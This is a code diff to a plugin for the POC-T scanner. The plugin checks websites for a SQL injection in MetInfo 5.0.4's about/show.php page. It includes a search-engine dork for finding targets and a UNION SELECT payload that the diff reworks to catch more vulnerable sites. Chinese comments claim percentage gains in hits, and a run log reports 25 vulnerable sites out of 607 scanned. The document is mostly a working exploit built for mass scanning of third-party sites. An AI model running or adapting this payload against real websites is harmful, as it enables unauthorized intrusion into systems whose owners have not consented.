@@ -10,7 +10,10 @@ Dork
   Powered by MetInfo 5.0.4
 
 Usage
-  python POC-T.py -m metinfo-504-sqli --api --dork="Powered by MetInfo 5.0.4"
+  python POC-T.py -T -m metinfo-504-sqli -f ./data/metinfo.txt -t 50
+
+Result
+  25 found | 0 remaining | 607 scanned in 107.51 seconds
 
 """
 
@@ -26,13 +29,14 @@ def poc(url):
         else:
             url = 'http://' + url
     plain, cipher = randomMD5()
-    payload = "/about/show.php?id=-2864 UNION ALL SELECT 25,25,25,25,25,25,25,25,25,25,25,25,25,25,CONCAT(0x717a716b71,IFNULL(CAST(md5(%s) AS CHAR),0x20),0x7171707871),25,25,25,25,25,25,25,25,25,25,25,25--" % plain
-    for each in iterate_path(url):
+    # 用全部字段验证，增加70%结果
+    payload = "/about/show.php?lang=en&id=-2864 UNION ALL SELECT " + (("md5(%s)," % plain) * 27).rstrip(',') + '--'
+    for each in iterate_path(url):  # 对每个子路径尝试，增加20%结果
         target = each.rstrip('/') + payload
         try:
-            c = requests.get(target, timeout=15).content
-            if cipher in c:
-                return True
+            r = requests.get(target, timeout=20)
+            if r.status_code == 200 and cipher in r.content:
+                return url
         except Exception:
-            break
+            pass  # 从break改为pass增加10%结果
     return False
